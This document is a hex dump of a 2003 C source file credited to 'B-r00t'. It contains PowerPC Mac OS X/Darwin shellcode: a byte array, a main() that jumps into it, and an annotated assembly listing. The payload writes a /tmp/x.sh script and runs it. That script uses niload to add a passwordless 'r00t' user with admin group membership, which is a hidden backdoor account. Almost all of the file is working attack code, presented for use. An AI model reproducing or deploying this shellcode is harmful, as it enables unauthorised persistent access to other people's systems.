00000000  2f 2a 20 0d 0a 50 50 43  20 4f 53 20 58 20 2f 20  |/* ..PPC OS X / |
00000010  44 61 72 77 69 6e 20 53  68 65 6c 6c 63 6f 64 65  |Darwin Shellcode|
00000020  20 62 79 20 42 2d 72 30  30 74 2e 20 32 30 30 33  | by B-r00t. 2003|
00000030  2e 0d 0a 6f 70 65 6e 28  29 3b 20 77 72 69 74 65  |...open(); write|
00000040  28 29 3b 20 63 6c 6f 73  65 28 29 3b 20 65 78 65  |(); close(); exe|
00000050  63 76 65 28 29 3b 20 65  78 69 74 28 29 3b 0d 0a  |cve(); exit();..|
00000060  53 65 65 20 41 53 4d 20  62 65 6c 6f 77 2e 0d 0a  |See ASM below...|
00000070  32 31 39 20 42 79 74 65  73 21 0d 0a 2a 2f 0d 0a  |219 Bytes!..*/..|
00000080  0d 0a 63 68 61 72 20 73  68 65 6c 6c 63 6f 64 65  |..char shellcode|
00000090  5b 5d 20 3d 0d 0a 22 5c  78 37 63 5c 78 61 35 5c  |[] =.."\x7c\xa5\|
000000a0  78 32 61 5c 78 37 39 5c  78 34 30 5c 78 38 32 5c  |x2a\x79\x40\x82\|
000000b0  78 66 66 5c 78 66 64 5c  78 37 64 5c 78 34 38 5c  |xff\xfd\x7d\x48\|
000000c0  78 30 32 5c 78 61 36 5c  78 33 62 5c 78 65 61 5c  |x02\xa6\x3b\xea\|
000000d0  78 30 31 5c 78 37 30 22  0d 0a 22 5c 78 33 39 5c  |x01\x70".."\x39\|
000000e0  78 36 30 5c 78 30 31 5c  78 37 30 5c 78 33 39 5c  |x60\x01\x70\x39\|
000000f0  78 31 66 5c 78 66 66 5c  78 30 64 5c 78 37 63 5c  |x1f\xff\x0d\x7c\|
00000100  78 61 38 5c 78 32 39 5c  78 61 65 5c 78 33 38 5c  |xa8\x29\xae\x38\|
00000110  78 37 66 5c 78 66 66 5c  78 30 34 22 0d 0a 22 5c  |x7f\xff\x04".."\|
00000120  78 33 38 5c 78 38 30 5c  78 30 32 5c 78 30 31 5c  |x38\x80\x02\x01\|
00000130  78 33 38 5c 78 61 30 5c  78 66 66 5c 78 66 66 5c  |x38\xa0\xff\xff\|
00000140  78 33 38 5c 78 30 62 5c  78 66 65 5c 78 39 35 5c  |x38\x0b\xfe\x95\|
00000150  78 34 34 5c 78 66 66 5c  78 66 66 5c 78 30 32 22  |x44\xff\xff\x02"|
00000160  0d 0a 22 5c 78 36 30 5c  78 36 30 5c 78 36 30 5c  |.."\x60\x60\x60\|
00000170  78 36 30 5c 78 33 38 5c  78 39 66 5c 78 66 66 5c  |x60\x38\x9f\xff\|
00000180  78 30 65 5c 78 33 38 5c  78 61 62 5c 78 66 65 5c  |x0e\x38\xab\xfe\|
00000190  78 65 35 5c 78 33 38 5c  78 30 62 5c 78 66 65 5c  |xe5\x38\x0b\xfe\|
000001a0  78 39 34 22 0d 0a 22 5c  78 34 34 5c 78 66 66 5c  |x94".."\x44\xff\|
000001b0  78 66 66 5c 78 30 32 5c  78 36 30 5c 78 36 30 5c  |xff\x02\x60\x60\|
000001c0  78 36 30 5c 78 36 30 5c  78 33 38 5c 78 30 62 5c  |x60\x60\x38\x0b\|
000001d0  78 66 65 5c 78 39 36 5c  78 34 34 5c 78 66 66 5c  |xfe\x96\x44\xff\|
000001e0  78 66 66 5c 78 30 32 22  0d 0a 22 5c 78 36 30 5c  |xff\x02".."\x60\|
000001f0  78 36 30 5c 78 36 30 5c  78 36 30 5c 78 37 63 5c  |x60\x60\x60\x7c\|
00000200  78 61 35 5c 78 32 61 5c  78 37 39 5c 78 33 38 5c  |xa5\x2a\x79\x38\|
00000210  78 37 66 5c 78 66 66 5c  78 30 34 5c 78 39 30 5c  |x7f\xff\x04\x90\|
00000220  78 36 31 5c 78 66 66 5c  78 66 38 22 0d 0a 22 5c  |x61\xff\xf8".."\|
00000230  78 39 30 5c 78 61 31 5c  78 66 66 5c 78 66 63 5c  |x90\xa1\xff\xfc\|
00000240  78 33 38 5c 78 38 31 5c  78 66 66 5c 78 66 38 5c  |x38\x81\xff\xf8\|
00000250  78 33 38 5c 78 30 62 5c  78 66 65 5c 78 63 62 5c  |x38\x0b\xfe\xcb\|
00000260  78 34 34 5c 78 66 66 5c  78 66 66 5c 78 30 32 22  |x44\xff\xff\x02"|
00000270  0d 0a 22 5c 78 36 30 5c  78 36 30 5c 78 36 30 5c  |.."\x60\x60\x60\|
00000280  78 36 30 5c 78 33 38 5c  78 30 62 5c 78 66 65 5c  |x60\x38\x0b\xfe\|
00000290  78 39 31 5c 78 34 34 5c  78 66 66 5c 78 66 66 5c  |x91\x44\xff\xff\|
000002a0  78 30 32 5c 78 32 66 5c  78 37 34 5c 78 36 64 5c  |x02\x2f\x74\x6d\|
000002b0  78 37 30 22 0d 0a 22 5c  78 32 66 5c 78 37 38 5c  |x70".."\x2f\x78\|
000002c0  78 32 65 5c 78 37 33 5c  78 36 38 5c 78 35 38 5c  |x2e\x73\x68\x58\|
000002d0  78 32 33 5c 78 32 31 5c  78 32 66 5c 78 36 32 5c  |x23\x21\x2f\x62\|
000002e0  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 37 33 5c  |x69\x6e\x2f\x73\|
000002f0  78 36 38 5c 78 30 61 22  0d 0a 22 5c 78 32 66 5c  |x68\x0a".."\x2f\|
00000300  78 36 32 5c 78 36 39 5c  78 36 65 5c 78 32 66 5c  |x62\x69\x6e\x2f\|
00000310  78 36 35 5c 78 36 33 5c  78 36 38 5c 78 36 66 5c  |x65\x63\x68\x6f\|
00000320  78 32 30 5c 78 32 37 5c  78 37 32 5c 78 33 30 5c  |x20\x27\x72\x30\|
00000330  78 33 30 5c 78 37 34 5c  78 33 61 22 0d 0a 22 5c  |x30\x74\x3a".."\|
00000340  78 33 61 5c 78 33 39 5c  78 33 39 5c 78 33 39 5c  |x3a\x39\x39\x39\|
00000350  78 33 61 5c 78 33 38 5c  78 33 30 5c 78 33 61 5c  |x3a\x38\x30\x3a\|
00000360  78 33 61 5c 78 33 30 5c  78 33 61 5c 78 33 30 5c  |x3a\x30\x3a\x30\|
00000370  78 33 61 5c 78 37 32 5c  78 33 30 5c 78 33 30 22  |x3a\x72\x30\x30"|
00000380  0d 0a 22 5c 78 37 34 5c  78 33 61 5c 78 32 66 5c  |.."\x74\x3a\x2f\|
00000390  78 33 61 5c 78 32 66 5c  78 36 32 5c 78 36 39 5c  |x3a\x2f\x62\x69\|
000003a0  78 36 65 5c 78 32 66 5c  78 37 33 5c 78 36 38 5c  |x6e\x2f\x73\x68\|
000003b0  78 32 37 5c 78 32 30 5c  78 37 63 5c 78 32 30 5c  |x27\x20\x7c\x20\|
000003c0  78 32 66 22 0d 0a 22 5c  78 37 35 5c 78 37 33 5c  |x2f".."\x75\x73\|
000003d0  78 37 32 5c 78 32 66 5c  78 36 32 5c 78 36 39 5c  |x72\x2f\x62\x69\|
000003e0  78 36 65 5c 78 32 66 5c  78 36 65 5c 78 36 39 5c  |x6e\x2f\x6e\x69\|
000003f0  78 36 63 5c 78 36 66 5c  78 36 31 5c 78 36 34 5c  |x6c\x6f\x61\x64\|
00000400  78 32 30 5c 78 32 64 22  0d 0a 22 5c 78 36 64 5c  |x20\x2d".."\x6d\|
00000410  78 32 30 5c 78 37 30 5c  78 36 31 5c 78 37 33 5c  |x20\x70\x61\x73\|
00000420  78 37 33 5c 78 37 37 5c  78 36 34 5c 78 32 30 5c  |x73\x77\x64\x20\|
00000430  78 32 65 5c 78 30 61 22  3b 0d 0a 0d 0a 69 6e 74  |x2e\x0a";....int|
00000440  20 6d 61 69 6e 20 28 76  6f 69 64 29 20 0d 0a 7b  | main (void) ..{|
00000450  0d 0a 20 20 20 20 20 20  20 20 5f 5f 61 73 6d 5f  |..        __asm_|
00000460  5f 28 22 62 20 5f 73 68  65 6c 6c 63 6f 64 65 22  |_("b _shellcode"|
00000470  29 3b 0d 0a 7d 0d 0a 0d  0a 0d 0a 2f 2a 0d 0a 3b  |);..}....../*..;|
00000480  20 50 50 43 20 4f 53 20  58 20 2f 20 44 61 72 77  | PPC OS X / Darw|
00000490  69 6e 20 53 68 65 6c 6c  63 6f 64 65 20 62 79 20  |in Shellcode by |
000004a0  42 2d 72 30 30 74 2e 20  0d 0a 3b 20 6f 70 65 6e  |B-r00t. ..; open|
000004b0  28 29 3b 20 77 72 69 74  65 28 29 3b 20 63 6c 6f  |(); write(); clo|
000004c0  73 65 28 29 3b 20 65 78  65 63 76 65 28 29 3b 20  |se(); execve(); |
000004d0  65 78 69 74 28 29 0d 0a  3b 20 41 64 64 73 20 61  |exit()..; Adds a|
000004e0  20 75 73 65 72 20 61 63  63 6f 75 6e 74 20 28 61  | user account (a|
000004f0  64 6d 69 6e 20 6d 65 6d  62 65 72 29 20 75 73 69  |dmin member) usi|
00000500  6e 67 20 61 20 0d 0a 3b  20 27 2f 74 6d 70 2f 78  |ng a ..; '/tmp/x|
00000510  2e 73 68 20 73 68 65 6c  6c 73 63 72 69 70 74 20  |.sh shellscript |
00000520  28 6e 69 6c 6f 61 64 29  2e 0d 0a 3b 20 65 63 68  |(niload)...; ech|
00000530  6f 20 27 72 30 30 74 3a  3a 39 39 39 3a 38 30 3a  |o 'r00t::999:80:|
00000540  3a 30 3a 30 3a 72 30 30  74 3a 2f 3a 2f 62 69 6e  |:0:0:r00t:/:/bin|
00000550  2f 73 68 27 20 7c 20 2f  75 73 72 2f 62 69 6e 2f  |/sh' | /usr/bin/|
00000560  6e 69 6c 6f 61 64 20 2d  6d 20 70 61 73 73 77 64  |niload -m passwd|
00000570  20 2e 20 0d 0a 3b 0d 0a  2e 67 6c 6f 62 6c 20 5f  | . ..;...globl _|
00000580  6d 61 69 6e 0d 0a 2e 74  65 78 74 0d 0a 5f 6d 61  |main...text.._ma|
00000590  69 6e 3a 0d 0a 20 20 20  20 20 20 20 20 78 6f 72  |in:..        xor|
000005a0  2e 20 20 20 20 72 35 2c  20 72 35 2c 20 72 35 0d  |.    r5, r5, r5.|
000005b0  0a 20 20 20 20 20 20 20  20 62 6e 65 6c 20 20 20  |.        bnel   |
000005c0  20 5f 6d 61 69 6e 20 20  20 20 20 20 20 20 20 20  | _main          |
000005d0  20 20 20 20 20 20 20 20  20 20 0d 0a 20 20 20 20  |          ..    |
000005e0  20 20 20 20 6d 66 6c 72  20 20 20 20 72 31 30 0d  |    mflr    r10.|
000005f0  0a 09 61 64 64 69 09 72  33 31 2c 20 72 31 30 2c  |..addi.r31, r10,|
00000600  20 33 36 38 0d 0a 09 6c  69 09 72 31 31 2c 20 33  | 368...li.r11, 3|
00000610  36 38 0d 0a 20 20 20 20  20 20 20 20 61 64 64 69  |68..        addi|
00000620  20 20 20 20 72 38 2c 20  72 33 31 2c 20 2d 32 34  |    r8, r31, -24|
00000630  33 0d 0a 20 20 20 20 20  20 20 20 73 74 62 78 20  |3..        stbx |
00000640  20 20 20 72 35 2c 20 72  38 2c 20 72 35 0d 0a 20  |   r5, r8, r5.. |
00000650  20 20 20 20 20 20 20 61  64 64 69 20 20 20 20 72  |       addi    r|
00000660  33 2c 20 72 33 31 2c 20  2d 32 35 32 0d 0a 20 20  |3, r31, -252..  |
00000670  20 20 20 20 20 20 6c 69  20 20 20 20 20 20 72 34  |      li      r4|
00000680  2c 20 35 31 33 0d 0a 20  20 20 20 20 20 20 20 6c  |, 513..        l|
00000690  69 20 20 20 20 20 20 72  35 2c 20 2d 31 20 20 0d  |i      r5, -1  .|
000006a0  0a 20 20 20 20 20 20 20  20 61 64 64 69 20 20 20  |.        addi   |
000006b0  20 72 30 2c 20 20 72 31  31 2c 20 2d 33 36 33 0d  | r0,  r11, -363.|
000006c0  0a 20 20 20 20 20 20 20  20 2e 6c 6f 6e 67 20 20  |.        .long  |
000006d0  20 30 78 34 34 66 66 66  66 30 32 0d 0a 20 20 20  | 0x44ffff02..   |
000006e0  20 20 20 20 20 2e 6c 6f  6e 67 20 20 20 30 78 36  |     .long   0x6|
000006f0  30 36 30 36 30 36 30 0d  0a 20 20 20 20 20 20 20  |0606060..       |
00000700  20 61 64 64 69 20 20 20  20 72 34 2c 20 72 33 31  | addi    r4, r31|
00000710  2c 20 2d 32 34 32 0d 0a  20 20 20 20 20 20 20 20  |, -242..        |
00000720  61 64 64 69 20 20 20 20  72 35 2c 20 72 31 31 2c  |addi    r5, r11,|
00000730  20 2d 32 38 33 0d 0a 20  20 20 20 20 20 20 20 61  | -283..        a|
00000740  64 64 69 20 20 20 20 72  30 2c 20 72 31 31 2c 20  |ddi    r0, r11, |
00000750  2d 33 36 34 0d 0a 20 20  20 20 20 20 20 20 2e 6c  |-364..        .l|
00000760  6f 6e 67 20 20 20 30 78  34 34 66 66 66 66 30 32  |ong   0x44ffff02|
00000770  0d 0a 20 20 20 20 20 20  20 20 2e 6c 6f 6e 67 20  |..        .long |
00000780  20 20 30 78 36 30 36 30  36 30 36 30 0d 0a 20 20  |  0x60606060..  |
00000790  20 20 20 20 20 20 61 64  64 69 20 20 20 20 72 30  |      addi    r0|
000007a0  2c 20 72 31 31 2c 20 2d  33 36 32 0d 0a 20 20 20  |, r11, -362..   |
000007b0  20 20 20 20 20 2e 6c 6f  6e 67 20 20 20 30 78 34  |     .long   0x4|
000007c0  34 66 66 66 66 30 32 20  20 20 20 20 20 0d 0a 20  |4ffff02      .. |
000007d0  20 20 20 20 20 20 20 2e  6c 6f 6e 67 20 20 20 30  |       .long   0|
000007e0  78 36 30 36 30 36 30 36  30 0d 0a 20 20 20 20 20  |x60606060..     |
000007f0  20 20 20 78 6f 72 2e 20  20 20 20 72 35 2c 20 72  |   xor.    r5, r|
00000800  35 2c 20 72 35 0d 0a 20  20 20 20 20 20 20 20 61  |5, r5..        a|
00000810  64 64 69 20 20 20 20 72  33 2c 20 72 33 31 2c 20  |ddi    r3, r31, |
00000820  2d 32 35 32 20 20 20 20  20 20 20 20 20 20 0d 0a  |-252          ..|
00000830  20 20 20 20 20 20 20 20  73 74 77 20 20 20 20 20  |        stw     |
00000840  72 33 2c 20 2d 38 28 72  31 29 20 20 20 20 20 20  |r3, -8(r1)      |
00000850  0d 0a 20 20 20 20 20 20  20 20 73 74 77 20 20 20  |..        stw   |
00000860  20 20 72 35 2c 20 2d 34  28 72 31 29 20 20 20 20  |  r5, -4(r1)    |
00000870  20 20 0d 0a 20 20 20 20  20 20 20 20 73 75 62 69  |  ..        subi|
00000880  20 20 20 20 72 34 2c 20  72 31 2c 20 38 20 20 20  |    r4, r1, 8   |
00000890  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 61 64  |    ..        ad|
000008a0  64 69 20 20 20 20 72 30  2c 20 72 31 31 2c 20 2d  |di    r0, r11, -|
000008b0  33 30 39 20 20 20 20 20  20 20 20 20 20 20 20 20  |309             |
000008c0  0d 0a 20 20 20 20 20 20  20 20 2e 6c 6f 6e 67 20  |..        .long |
000008d0  20 20 30 78 34 34 66 66  66 66 30 32 20 20 20 20  |  0x44ffff02    |
000008e0  20 20 0d 0a 20 20 20 20  20 20 20 20 2e 6c 6f 6e  |  ..        .lon|
000008f0  67 20 20 20 30 78 36 30  36 30 36 30 36 30 0d 0a  |g   0x60606060..|
00000900  20 20 20 20 20 20 20 20  61 64 64 69 20 20 20 20  |        addi    |
00000910  72 30 2c 20 72 31 31 2c  20 2d 33 36 37 0d 0a 20  |r0, r11, -367.. |
00000920  20 20 20 20 20 20 20 2e  6c 6f 6e 67 20 20 20 30  |       .long   0|
00000930  78 34 34 66 66 66 66 30  32 0d 0a 70 61 74 68 3a  |x44ffff02..path:|
00000940  20 20 20 2e 61 73 63 69  7a 20 20 22 2f 74 6d 70  |   .asciz  "/tmp|
00000950  2f 78 2e 73 68 58 23 21  2f 62 69 6e 2f 73 68 5c  |/x.shX#!/bin/sh\|
00000960  6e 2f 62 69 6e 2f 65 63  68 6f 20 27 72 30 30 74  |n/bin/echo 'r00t|
00000970  3a 3a 39 39 39 3a 38 30  3a 3a 30 3a 30 3a 72 30  |::999:80::0:0:r0|
00000980  30 74 3a 2f 3a 2f 62 69  6e 2f 73 68 27 20 7c 20  |0t:/:/bin/sh' | |
00000990  2f 75 73 72 2f 62 69 6e  2f 6e 69 6c 6f 61 64 20  |/usr/bin/niload |
000009a0  2d 6d 20 70 61 73 73 77  64 20 2e 5c 6e 22 0d 0a  |-m passwd .\n"..|
000009b0  2a 2f                                             |*/|
000009b2
